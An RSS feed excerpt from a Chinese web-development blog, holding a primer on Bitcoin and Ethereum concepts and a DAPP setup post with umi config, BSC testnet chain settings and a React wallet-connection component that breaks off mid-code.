<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <atom:link href="https://www.matrixtheone.ga/web/rss.xml" rel="self" type="application/rss+xml"/>
    <title>coderljw</title>
    <link>https://www.matrixtheone.ga/web/</link>
    <description>兴趣使然的英雄</description>
    <language>zh-CN</language>
    <pubDate>Mon, 08 May 2023 14:50:14 GMT</pubDate>
    <lastBuildDate>Mon, 08 May 2023 14:50:14 GMT</lastBuildDate>
    <generator>@mr-hope/vuepress-plugin-feed</generator>
    <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
    <category>区块链</category>
    <category>DAPP</category>
    <category>Solidity</category>
    <category>Command</category>
    <category>CSS</category>
    <category>浏览器</category>
    <category>Flutter</category>
    <category>HTML</category>
    <category>面试</category>
    <category>JS 高级</category>
    <category>网络</category>
    <category>手写代码</category>
    <category>React</category>
    <category>数据结构与算法</category>
    <category>Vue</category>
    <category>30 秒代码</category>
    <category>Electron</category>
    <category>Lint</category>
    <category>Next</category>
    <category>Nginx</category>
    <category>Node</category>
    <category>Nuxt</category>
    <category>TS</category>
    <category>App</category>
    <category>Uni App</category>
    <category>H5</category>
    <category>小程序</category>
    <category>Utils</category>
    <category>Webpack</category>
    <category>JS 基础</category>
    <item>
      <title>基本概念</title>
      <link>https://www.matrixtheone.ga/web/blockChain/Basic/</link>
      <guid>https://www.matrixtheone.ga/web/blockChain/Basic/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">基本概念</source>
      <category>区块链</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-base58"> 1. Base58</h2>
<p>Base58 是用于比特币（Bitcoin）中使用的一种独特的编码方式，主要用于产生 Bitcoin 的钱包地址。相比 Base64，Base58 不使用数字 &quot;0&quot;，字母大写 &quot;O&quot;，字母大写 &quot;I&quot;，和字母小写 &quot;l&quot;，以及 &quot;+&quot; 和 &quot;/&quot; 符号。</p>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/Base58" target="_blank" rel="noopener noreferrer">Base58 - 维基百科</a></li>
</ul>
<h2 id="_2-哈希碰撞"> 2. 哈希碰撞</h2>
<div><pre><code><span>const</span> <span>calculate</span> <span>=</span> <span>(</span><span>d<span>,</span> n</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> exponent <span>=</span> <span>(</span><span>-</span>n <span>*</span> <span>(</span>n <span>-</span> <span>1</span><span>)</span><span>)</span> <span>/</span> <span>(</span><span>2</span> <span>*</span> d<span>)</span>
  <span>return</span> <span>1</span> <span>-</span> Math<span>.</span><span>E</span> <span>**</span> exponent
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><ul>
<li><a href="https://www.ruanyifeng.com/blog/2018/09/hash-collision-and-birthday-attack.html" target="_blank" rel="noopener noreferrer">哈希碰撞与生日攻击 - 阮一峰</a></li>
</ul>
<h2 id="_3-数字签名"> 3. 数字签名</h2>
<ul>
<li>
<p>数字签名的三个作用：防伪造，防篡改，防抵赖。</p>
</li>
<li>
<p>比特币采用的 ECDSA 签名算法需要一个私钥和公钥组成的秘钥对：私钥本质上就是一个 <span><span><i>Not supported content</i></span><span aria-hidden="true"><span><span style="height:0.8141em;"></span><span>1</span><span>～</span><span><span>2</span><span><span><span><span style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span style="height:2.7em;"></span><span><span><span>256</span></span></span></span></span></span></span></span></span></span></span></span> 的随机数，公钥是由私钥根据 ECDSA 算法推算出来的，通过私钥可以很容易推算出公钥，所以不必保存公钥，但是，通过公钥无法反推私钥，只能暴力破解。</p>
</li>
<li>
<p><a href="https://www.liaoxuefeng.com/wiki/1207298049439968/1311929746325537" target="_blank" rel="noopener noreferrer">P2P 交易原理 - 廖雪峰</a></p>
</li>
<li>
<p><a href="https://www.liaoxuefeng.com/wiki/1207298049439968/1207687429747616" target="_blank" rel="noopener noreferrer">签名 - 廖雪峰</a></p>
</li>
<li>
<p><a href="https://www.ruanyifeng.com/blog/2011/08/what_is_a_digital_signature.html" target="_blank" rel="noopener noreferrer">数字签名是什么？ - 阮一峰</a></p>
</li>
</ul>
<h2 id="_4-公私钥与地址"> 4. 公私钥与地址</h2>
<ul>
<li>
<p>比特币的公钥是根据私钥由 ECDSA 算法推算出来的，公钥有压缩和非压缩两种表示方法，可互相转换。比特币的地址是公钥哈希的编码，并不是公钥本身，通过公钥可推导出地址。通过地址不可推导出公钥，通过公钥不可推导出私钥。</p>
<img :src="$withBase('/images/Block-Chain/比特币地址生成.png')" loading="lazy">
</li>
<li>
<p><a href="https://www.liaoxuefeng.com/wiki/1207298049439968/1210215537429856" target="_blank" rel="noopener noreferrer">公钥和地址 - 廖雪峰</a></p>
</li>
<li>
<p><a href="http://www.gobittest.appspot.com/Address" target="_blank" rel="noopener noreferrer">Addresses - Bitcoin Tests</a></p>
</li>
</ul>
<h2 id="_5-比特币支付"> 5. 比特币支付</h2>
<ul>
<li>
<p>比特币支付的本质是由程序触发的数字资产转移。比特币的支付脚本就是对输入的两个数据视作签名和公钥，然后先验证公钥哈希是否与地址相同，再根据公钥验证签名，这种标准脚本称之为 P2PKH（Pay to Public Key Hash）脚本。</p>
</li>
<li>
<p>由此催生出了智能合约：当一个预先编好的条件被触发时，智能合约可以自动执行相应的程序，自动完成数字资产的转移。保险、贷款等金融活动在将来都可以以智能合约的形式执行。智能合约以程序来替代传统的纸质文件条款，并由计算机强制执行，将具有更高的更低的信任成本和运营成本。</p>
</li>
<li>
<p>多重签名可以实现 N 个人持有私钥，其中 M 个人同意即可花费资金的功能。多重签名降低了单个私钥丢失的风险。</p>
</li>
<li>
<p><a href="https://www.liaoxuefeng.com/wiki/1207298049439968/1311929802948641" target="_blank" rel="noopener noreferrer">可编程支付原理 - 廖雪峰</a></p>
</li>
<li>
<p><a href="https://www.liaoxuefeng.com/wiki/1207298049439968/1207315329092960" target="_blank" rel="noopener noreferrer">多重签名 - 廖雪峰</a></p>
</li>
</ul>
<h2 id="_6-utxo"> 6. UTXO</h2>
<ul>
<li>
<p>比特币区块链使用 UTXO 模型，它没有账户这个概念。重建整个地址-余额数据库需要扫描整个区块链，并按每个交易依次更新记录，即可得到当前状态。</p>
</li>
<li>
<p><a href="https://www.liaoxuefeng.com/wiki/1207298049439968/1207298275932480" target="_blank" rel="noopener noreferrer">UTXO 模型 - 廖雪峰</a></p>
</li>
</ul>
<h2 id="_7-merkle-tree"> 7. Merkle Tree</h2>
<ul>
<li>
<p>梅克尔树是一种二叉树，能快速检查和归纳大量数据，可用于验证区块中交易记录的完整性，保证所有交易的不可篡改。</p>
</li>
<li>
<p>Merkle Root 为 Merkle Tree 顶点，存储在区块头中。</p>
<img :src="$withBase('/images/Block-Chain/Merkle Tree.png')" loading="lazy">
</li>
</ul>
<h2 id="_8-segwit-地址"> 8. Segwit 地址</h2>
<ul>
<li>
<p>Segwit 地址又称隔离见证地址。比特币延展性攻击的原因是 ECDSA 签名总是有两个有效签名，且可以相互计算。</p>
</li>
<li>
<p>要解决延展性攻击的问题，有两个办法，一是对交易签名进行归一化（Normalize）。因为 ECDSA 签名后总有两个有效的签名 (r, s) 和 (r, -s mod N)，那只接受数值较小的那个签名，为此比特币引入了一个 SCRIPT_VERIFY_LOW_S 标志仅接受较小值的签名。</p>
</li>
<li>
<p>另一个办法是把签名数据移到交易之外，这样交易本身的哈希就不会变化。不含签名的交易计算出的哈希称为 wtxid，为此引入了一种新的隔离见证地址。</p>
</li>
<li>
<p><a href="https://www.liaoxuefeng.com/wiki/1207298049439968/1207366165169216" target="_blank" rel="noopener noreferrer">Segwit 地址 - 廖雪峰</a></p>
</li>
</ul>
<h2 id="_9-分叉"> 9. 分叉</h2>
<ul>
<li>
<p>伪·软分叉（不分叉）：旧节点接受新区块，新节点也接受旧区块。</p>
</li>
<li>
<p>真·软分叉：旧节点接受新区块，新节点不接受旧区块。</p>
<blockquote>
<ol>
<li>其实没分叉：新节点算力超过 50%。</li>
<li>确实分叉了：新节点算力不到 50%。</li>
</ol>
</blockquote>
</li>
<li>
<p>硬分叉：旧节点不接受新区块。</p>
</li>
<li>
<p><a href="https://learnblockchain.cn/article/849" target="_blank" rel="noopener noreferrer">关于扩容与分叉（上）- maxdeath</a></p>
</li>
</ul>
<h2 id="_10-隔离见证"> 10. 隔离见证</h2>
<ul>
<li>
<p>比特币的格式里，允许用脚本来替换签名。签名大概占了交易大小的 2/3 空间（约 150 字节）。</p>
</li>
<li>
<p>隔离见证区块：每笔交易都被分成了两部分：交易和见证（签名）。交易部分只有 100 字节左右，于是一个 1MB 的区块里面能放 10000 笔交易（原来是 4000 笔）。所有的见证部分，大约 1.5MB - 2MB，都被扔到了后面。</p>
</li>
<li>
<p>特点：</p>
<blockquote>
<ul>
<li>是软分叉甚至不分叉。</li>
<li>理论上来讲可能提高 2-3 倍的交易量。</li>
<li>支持闪电网络，可以将一部分交易挪到链下进行，减轻主链的负担。</li>
<li>会降低比特币的安全性。</li>
</ul>
</blockquote>
</li>
<li>
<p><a href="https://learnblockchain.cn/article/849#%E9%9A%94%E7%A6%BB%E8%A7%81%E8%AF%81" target="_blank" rel="noopener noreferrer">隔离见证 - maxdeath</a></p>
</li>
<li>
<p><a href="https://learnblockchain.cn/article/850" target="_blank" rel="noopener noreferrer">关于扩容与分叉（下）- maxdeath</a></p>
</li>
</ul>
<h2 id="_11-hd-钱包"> 11. HD 钱包</h2>
<ul>
<li>
<p>HD 钱包采用分层确定性算法通过根扩展私钥计算所有层级的所有子扩展私钥，继而得到扩展公钥和地址。</p>
</li>
<li>
<p>可以通过普通衍生和硬化衍生两种方式计算扩展子私钥，后者更安全，但对应的扩展公钥无法计算硬化衍生的子扩展公钥。</p>
</li>
<li>
<p>通过扩展公钥可以在没有扩展私钥的前提下计算所有普通子扩展公钥，此特性可实现观察钱包。</p>
</li>
<li>
<p>HD 钱包通过 Bloom Filter 可以高效监控链上的所有地址，并根据是否是本地管理的地址决定如何计算钱包余额。</p>
</li>
<li>
<p><a href="https://www.liaoxuefeng.com/wiki/1207298049439968/1207298278803712" target="_blank" rel="noopener noreferrer">HD 钱包 - 廖雪峰</a></p>
</li>
<li>
<p><a href="https://www.liaoxuefeng.com/wiki/1207298049439968/1364939807653921" target="_blank" rel="noopener noreferrer">地址监控 - 廖雪峰</a></p>
</li>
</ul>
<h2 id="_12-助记词"> 12. 助记词</h2>
<ul>
<li>
<p>BIP-39 规范通过使用助记词 + 口令来生成 HD 钱包的种子，用户只需记忆助记词和口令即可随时恢复 HD 钱包。生成助记词的过程是计算机随机产生的，用户只要记住这些助记词，就可以根据助记词推算出 HD 钱包的种子。</p>
</li>
<li>
<p>助记词的意义就是作为私钥的备份。</p>
</li>
<li>
<p><a href="https://www.liaoxuefeng.com/wiki/1207298049439968/1207320517404448" target="_blank" rel="noopener noreferrer">助记词 - 廖雪峰</a></p>
</li>
</ul>
<h2 id="_13-以太坊"> 13. 以太坊</h2>
<ul>
<li>
<p>以太坊采用账户余额模型，通常情况下一个以太坊地址已够用。如果要生成多个地址，可继续派生 m/44'/60'/0'/0/1、m/44'/60'/0'/0/2 等。</p>
</li>
<li>
<p>以太坊的私钥和公钥采用和比特币一样的 ECDSA 算法和 secp256k1 曲线，并且可以复用比特币的 HD 钱包助记词。</p>
</li>
<li>
<p>比特币每隔 2015 个区块调整挖矿难度。以太坊每个区块都会调整挖矿难度。</p>
<blockquote>
<p>比特币设计时本来打算每 2016 个区块调整一次难度，也就是两周一次，但是由于第一版代码的一个 bug，实际调整周期是 2015 个区块。</p>
</blockquote>
</li>
<li>
<p>地址生成。</p>
<img :src="$withBase('/images/Block-Chain/以太坊地址生成.png')" loading="lazy">
</li>
<li>
<p><a href="https://www.liaoxuefeng.com/wiki/1207298049439968/1207298477260480" target="_blank" rel="noopener noreferrer">以太坊/账户 - 廖雪峰</a></p>
</li>
</ul>
<h2 id="_14-智能合约"> 14. 智能合约</h2>
<ul>
<li>
<p>所谓智能合约，就是一种运行在区块链上的程序（用脚本更形象点）。以太坊通过 EVM 虚拟机执行智能合约代码。</p>
</li>
<li>
<p>合约被部署后将自动获得一个地址，并可像外部账户一样存取 Ether，还可以存储状态数据。只能被动地被外部账户调用，但在执行时可以调用其他合约的公共函数。</p>
</li>
<li>
<p><a href="https://www.liaoxuefeng.com/wiki/1207298049439968/1207297939801024" target="_blank" rel="noopener noreferrer">智能合约 - 廖雪峰</a></p>
</li>
</ul>
<h2 id="_15-术语"> 15. 术语</h2>
<ul>
<li>
<p>手续费 = GasUsed * GasPrice</p>
</li>
<li>
<p>GasUsed：Gas 实际消耗量。</p>
<blockquote>
<ul>
<li>区块：所有交易消耗的 Gas 总量。</li>
<li>交易：实际消耗的 Gas。一笔普通转账交易固定消耗 21000 Gas，也是最小 Gas 消耗量。</li>
</ul>
</blockquote>
</li>
<li>
<p>GasPrice：Gas 消耗单价，用户交易前设置，矿工可根据 GasPrice 选择是否打包。</p>
</li>
<li>
<p>GasLimit：Gas 可消耗上限。</p>
<blockquote>
<ul>
<li>区块：所有交易 Gas 消耗上限，防止无法停止（死循环）的合约来阻塞网络。每个区块的矿工可调整区块 GasLimit，任意加减 1/2024（0.0976%）。</li>
<li>交易：用户设置交易可消耗的 Gas 上限。如果实际 Gas 消耗超出用户设置的 GasLimit，那么该交易失败，消耗的 Gas 不会返还（消耗了算力）。如果实际 Gas 消耗小于用户设置的 GasLimit，那么超出的 Gas 会返还用户。</li>
</ul>
</blockquote>
</li>
<li>
<p>Nonce：随机数。</p>
<blockquote>
<ul>
<li>区块：工作量证明，也就是猜出的一个正确答案，代表挖矿成功。</li>
<li>账户：防止多重交易（双花），交易自增长（消息调用不会增长）。如果用户自定义交易 Nonce 大于账户 Nonce + 1，那么交易会失败。如果一个区块上用户有两个交易的 Nonce 相同（自增长 Nonce），矿工可选择一笔交易打包，另一笔交易丢弃。矿工当然会选 GasPrice 高的那笔哟，这样可以在上一笔交易打包前，发出另一笔 Nonce 一样，但 GasPrice 较高的交易，来取消上一笔交易（看手速与运气的时候了）。</li>
</ul>
</blockquote>
</li>
<li>
<p>代币标准：如果同一个集合的两个物品具有不同的特征，那么这两个物品是非同质的，而同质是指某个部分或数量可以被另一个同等部分或数量所代替。</p>
<blockquote>
<ul>
<li>ERC20：同质代币（BNB 等），可置换、可细分。</li>
<li>ERC721：非同质代币（CryptoKitties 等），不可置换、不可细分（Token 最小单位 1）。</li>
</ul>
</blockquote>
</li>
<li>
<p><a href="https://learnblockchain.cn/2018/01/11/guide" target="_blank" rel="noopener noreferrer">区块链技术入门学习指引 - Tiny 熊</a></p>
</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Config</title>
      <link>https://www.matrixtheone.ga/web/blockChain/DAPP/Config/</link>
      <guid>https://www.matrixtheone.ga/web/blockChain/DAPP/Config/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Config</source>
      <category>DAPP</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-config"> 1. config</h2>
<ul>
<li><a href="https://stackoverflow.com/questions/69888765/getting-netlify-build-error-when-importing-web3-in-nextjs-application-error" target="_blank" rel="noopener noreferrer">SSR 忽略 electron</a>。</li>
</ul>
<div><pre><code><span>import</span> <span>{</span> defineConfig <span>}</span> <span>from</span> <span>'umi'</span>

<span>export</span> <span>default</span> <span>defineConfig</span><span>(</span><span>{</span>
  <span>chainWebpack</span><span>:</span> <span>(</span>config<span>,</span> <span>{</span> webpack <span>}</span><span>)</span> <span>=></span> <span>{</span>
    config<span>.</span><span>plugin</span><span>(</span><span>'IgnorePlugin'</span><span>)</span><span>.</span><span>use</span><span>(</span>webpack<span>.</span>IgnorePlugin<span>,</span> <span>[</span>
      <span>{</span>
        resourceRegExp<span>:</span> <span><span>/</span><span>^electron$</span><span>/</span></span><span>,</span>
      <span>}</span><span>,</span>
    <span>]</span><span>)</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><ul>
<li>配置测试网/主网，chainId 要以 16 进制表示。</li>
</ul>
<div><pre><code><span>import</span> <span>{</span> defineConfig <span>}</span> <span>from</span> <span>'umi'</span>

<span>export</span> <span>default</span> <span>defineConfig</span><span>(</span><span>{</span>
  define<span>:</span> <span>{</span>
    <span>'process.env.CHAIN'</span><span>:</span> <span>{</span>
      chainId<span>:</span> <span><span>`</span><span>0x</span><span><span>${</span><span>(</span><span>97</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>)</span><span>}</span></span><span>`</span></span><span>,</span>
      chainName<span>:</span> <span>'Binance Smart Chain Testnet'</span><span>,</span>
      nativeCurrency<span>:</span> <span>{</span>
        name<span>:</span> <span>'Binance Chain Native Token'</span><span>,</span>
        <span>symbol</span><span>:</span> <span>'tBNB'</span><span>,</span>
        decimals<span>:</span> <span>18</span><span>,</span>
      <span>}</span><span>,</span>
      rpcUrls<span>:</span> <span>[</span>
        <span>'https://data-seed-prebsc-1-s1.binance.org:8545'</span><span>,</span>
        <span>'https://data-seed-prebsc-2-s1.binance.org:8545'</span><span>,</span>
        <span>'https://data-seed-prebsc-1-s2.binance.org:8545'</span><span>,</span>
        <span>'https://data-seed-prebsc-2-s2.binance.org:8545'</span><span>,</span>
        <span>'https://data-seed-prebsc-1-s3.binance.org:8545'</span><span>,</span>
        <span>'https://data-seed-prebsc-2-s3.binance.org:8545'</span><span>,</span>
      <span>]</span><span>,</span>
      blockExplorerUrls<span>:</span> <span>[</span><span>'https://testnet.bscscan.com/'</span><span>]</span><span>,</span>
      iconUrls<span>:</span> <span>[</span><span>'https://testnet.bscscan.com/images/favicon.ico'</span><span>]</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div><h2 id="_2-app-ts"> 2. app.ts</h2>
<ul>
<li>配置 library，注入 web3-react。</li>
</ul>
<div><pre><code><span>import</span> React <span>from</span> <span>'react'</span>
<span>import</span> Web3 <span>from</span> <span>'web3'</span>
<span>import</span> <span>{</span> Web3ReactProvider <span>}</span> <span>from</span> <span>'@web3-react/core'</span>

<span>function</span> <span>getLibrary</span><span>(</span>provider<span>:</span> <span>any</span><span>)</span> <span>{</span>
  <span>const</span> library <span>=</span> <span>new</span> <span>Web3</span><span>(</span>provider<span>)</span>
  library<span>.</span>pollingInterval <span>=</span> <span>12000</span>
  <span>return</span> library
<span>}</span>

<span>export</span> <span>function</span> <span>rootContainer</span><span>(</span>container<span>:</span> React<span>.</span>ReactNode<span>)</span> <span>{</span>
  <span>return</span> React<span>.</span><span>createElement</span><span>(</span>Web3ReactProvider<span>,</span> <span>{</span> getLibrary <span>}</span><span>,</span> container<span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h2 id="_3-connectchain-tsx"> 3. ConnectChain.tsx</h2>
<div><pre><code><span>import</span> <span>{</span> useState<span>,</span> useEffect<span>,</span> useRef <span>}</span> <span>from</span> <span>'react'</span>
<span>import</span> <span>{</span> useIntl<span>,</span> useModel <span>}</span> <span>from</span> <span>'umi'</span>
<span>import</span> <span>{</span> useWeb3React<span>,</span> UnsupportedChainIdError <span>}</span> <span>from</span> <span>'@web3-react/core'</span>
<span>import</span> <span>{</span> injected<span>,</span> walletconnect <span>}</span> <span>from</span> <span>'@/web3/connectors'</span>
<span>import</span> <span>{</span>
  useEagerConnect<span>,</span>
  useErrorMessage<span>,</span>
  useInactiveListener<span>,</span>
<span>}</span> <span>from</span> <span>'@/web3/hooks'</span>
<span>import</span> <span>{</span> useUser<span>,</span> useSyncCallback <span>}</span> <span>from</span> <span>'@/hooks'</span>
<span>import</span> storage <span>from</span> <span>'@/utils/storage'</span>
<span>import</span> <span>{</span> <span>ACCESS_TOKEN</span> <span>}</span> <span>from</span> <span>'@/utils/types'</span>
<span>import</span> InstallModal <span>from</span> <span>'./InstallModal'</span>
<span>import</span> Web3Modal <span>from</span> <span>'./Web3Modal'</span>
<span>import</span> AccountInfo <span>from</span> <span>'./AccountInfo'</span>
<span>import</span> Button <span>from</span> <span>'../Button'</span>
<span>import</span> styles <span>from</span> <span>'./index.less'</span>

<span>const</span> <span>ConnectChain</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>// 快速连接</span>
  <span>const</span> triedEager <span>=</span> <span>useEagerConnect</span><span>(</span><span>)</span>
  <span>useInactiveListener</span><span>(</span><span>!</span>triedEager<span>)</span>

  <span>const</span> <span>{</span> isLogin <span>}</span> <span>=</span> <span>useModel</span><span>(</span><span>'useLogin'</span><span>)</span>
  <span>const</span> <span>{</span> activate<span>,</span> deactivate<span>,</span> active<span>,</span> error<span>,</span> account <span>}</span> <span>=</span> <span>useWeb3React</span><span>(</span><span>)</span>
  <span>const</span> <span>{</span> login<span>,</span> layout<span>,</span> loading <span>}</span> <span>=</span> <span>useUser</span><span>(</span><span>)</span>
  <span>const</span> <span>{</span> formatMessage <span>}</span> <span>=</span> <span>useIntl</span><span>(</span><span>)</span>

  <span>const</span> currentError <span>=</span> <span>useRef</span><span>(</span><span>)</span>
  <span>const</span> prevAccount <span>=</span> <span>useRef</span><span>(</span><span>)</span>
  <span>const</span> documentHiddenAccount <span>=</span> <span>useRef</span><span>(</span><span>)</span>
  <span>const</span> <span>[</span>documentHidden<span>,</span> setDocumentHidden<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>false</span><span>)</span>

  <span>// 1: 安装MetaMask提示, 2: 连接钱包, 3: 账户信息</span>
  <span>const</span> <span>[</span>visible<span>,</span> setVisible<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>0</span><span>)</span>
  <span>const</span> showErrorMessage <span>=</span> <span>useErrorMessage</span><span>(</span><span>)</span>

  <span>// 快速登录</span>
  <span>// useEffect(() => {</span>
  <span>//   !isLogin &amp;&amp; injectedConnect(true)</span>
  <span>// }, [])</span>

  <span>// 监听账户切换</span>
  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span>
      prevAccount<span>.</span>current <span>&amp;&amp;</span>
      account <span>&amp;&amp;</span>
      prevAccount<span>.</span>current <span>!==</span> account <span>&amp;&amp;</span>
      isLogin <span>&amp;&amp;</span>
      <span>!</span>document<span>.</span>hidden
    <span>)</span> <span>{</span>
      <span>login</span><span>(</span><span>)</span>
    <span>}</span>

    <span>return</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
      prevAccount<span>.</span>current <span>=</span> account
    <span>}</span>
  <span>}</span><span>,</span> <span>[</span>account<span>]</span><span>)</span>

  <span>// 若在其他网站切换账户，回到页面时，让其重新登录</span>
  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span>
      <span>!</span>documentHidden <span>&amp;&amp;</span>
      isLogin <span>&amp;&amp;</span>
      documentHiddenAccount<span>.</span>current <span>&amp;&amp;</span>
      documentHiddenAccount<span>.</span>current <span>!==</span> account
    <span>)</span> <span>{</span>
      <span>login</span><span>(</span><span>)</span>
    <span>}</span>
  <span>}</span><span>,</span> <span>[</span>documentHidden<span>]</span><span>)</span>

  <span>// 提示错误</span>
  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    currentError<span>.</span>current <span>=</span> error
    error <span>&amp;&amp;</span> <span>showErrorMessage</span><span>(</span>error<span>)</span>
  <span>}</span><span>,</span> <span>[</span>error<span>]</span><span>)</span>

  <span>// 若在其他网站切换为不支持的网络，回到页面时，让其切换为支持的网络</span>
  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    document<span>.</span><span>addEventListener</span><span>(</span><span>'visibilitychange'</span><span>,</span> <span>async</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>setDocumentHidden</span><span>(</span>document<span>.</span>hidden<span>)</span>
      <span>documentHiddenFn</span><span>(</span><span>)</span>

      <span>const</span> isAuthorized <span>=</span> <span>await</span> injected<span>.</span><span>isAuthorized</span><span>(</span><span>)</span>
      <span>const</span> token <span>=</span> storage<span>.</span><span>get</span><span>(</span><span>ACCESS_TOKEN</span><span>)</span>
      <span>const</span> <span>{</span> ethereum <span>}</span> <span>=</span> window <span>as</span> <span>any</span>

      <span>if</span> <span>(</span>
        document<span>.</span>hidden <span>||</span>
        <span>!</span><span>(</span>
          isAuthorized <span>&amp;&amp;</span>
          token <span>&amp;&amp;</span>
          ethereum<span>?.</span>isMetaMask <span>&amp;&amp;</span>
          currentError<span>.</span>current <span>instanceof</span> <span>UnsupportedChainIdError</span>
        <span>)</span>
      <span>)</span>
        <span>return</span>

      <span>await</span> <span>activate</span><span>(</span>injected<span>)</span>
      <span>try</span> <span>{</span>
        <span>await</span> ethereum<span>.</span><span>request</span><span>(</span><span>{</span>
          method<span>:</span> <span>'wallet_switchEthereumChain'</span><span>,</span>
          params<span>:</span> <span>[</span><span>{</span> chainId<span>:</span> process<span>.</span>env<span>.</span><span>CHAIN</span><span>.</span>chainId <span>}</span><span>]</span><span>,</span>
        <span>}</span><span>)</span>
      <span>}</span> <span>catch</span> <span>(</span>switchError<span>:</span> <span>any</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span>switchError<span>.</span>code <span>===</span> <span>4902</span><span>)</span> <span>{</span>
          <span>try</span> <span>{</span>
            <span>await</span> ethereum<span>.</span><span>request</span><span>(</span><span>{</span>
              method<span>:</span> <span>'wallet_addEthereumChain'</span><span>,</span>
              params<span>:</span> <span>[</span>process<span>.</span>env<span>.</span><span>CHAIN</span><span>]</span><span>,</span>
            <span>}</span><span>)</span>
          <span>}</span> <span>catch</span> <span>(</span>addError<span>)</span> <span>{</span><span>}</span>
        <span>}</span>
      <span>}</span>
    <span>}</span><span>)</span>
  <span>}</span><span>,</span> <span>[</span><span>]</span><span>)</span>

  <span>// 存储页面隐藏时的账户</span>
  <span>const</span> documentHiddenFn <span>=</span> <span>useSyncCallback</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span>isLogin <span>&amp;&amp;</span> document<span>.</span>hidden<span>)</span> <span>{</span>
      documentHiddenAccount<span>.</span>current <span>=</span> account
    <span>}</span>
  <span>}</span><span>)</span>

  <span>// 小心闭包</span>
  <span>const</span> connected <span>=</span> <span>useSyncCallback</span><span>(</span><span>async</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span>active<span>)</span> <span>login</span><span>(</span><span>)</span>
  <span>}</span><span>)</span>

  <span>// 连接MetaMask</span>
  <span>const</span> <span>injectedConnect</span> <span>=</span> <span>async</span> isFirst <span>=></span> <span>{</span>
    <span>const</span> <span>{</span> ethereum <span>}</span> <span>=</span> window <span>as</span> <span>any</span>
    <span>if</span> <span>(</span><span>!</span>ethereum<span>?.</span>isMetaMask<span>)</span> <span>return</span> isFirst <span>?</span> <span>false</span> <span>:</span> <span>setVisible</span><span>(</span><span>1</span><span>)</span>

    <span>setVisible</span><span>(</span><span>0</span><span>)</span>
    <span>await</span> <span>deactivate</span><span>(</span><span>)</span>
    <span>await</span> <span>activate</span><span>(</span>injected<span>)</span>

    <span>try</span> <span>{</span>
      <span>await</span> ethereum<span>.</span><span>request</span><span>(</span><span>{</span>
        method<span>:</span> <span>'wallet_switchEthereumChain'</span><span>,</span>
        params<span>:</span> <span>[</span><span>{</span> chainId<span>:</span> process<span>.</span>env<span>.</span><span>CHAIN</span><span>.</span>chainId <span>}</span><span>]</span><span>,</span>
      <span>}</span><span>)</span>
    <span>}</span> <span>catch</span> <span>(</span>switchError<span>:</span> <span>any</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span>switchError<span>.</span>code <span>===</span> <span>4902</span><span>)</span> <span>{</span>
        <span>try</span> <span>{</span>
          <span>await</span> ethereum<span>.</span><span>request</span><span>(</span><span>{</span>
            method<span>:</span> <span>'wallet_addEthereumChain'</span><span>,</span>
            params<span>:</span> <span>[</span>process<span>.</span>env<span>.</span><span>CHAIN</span><span>]</span><span>,</span>
          <span>}</span><span>)</span>
        <span>}</span> <span>catch</span> <span>(</span>addError<span>)</span> <span>{</span><span>}</span>
      <span>}</span>
    <span>}</span>

    <span>connected</span><span>(</span><span>)</span>
  <span>}</span>

  <span>// 连接WalletConnect协议钱包</span>
  <span>const</span> <span>walletConnect</span> <span>=</span> <span>async</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>setVisible</span><span>(</span><span>0</span><span>)</span>
    <span>await</span> <span>deactivate</span><span>(</span><span>)</span>
    <span>await</span> <span>activate</span><span>(</span>walletconnect<span>)</span>
    <span>connected</span><span>(</span><span>)</span>
  <span>}</span>

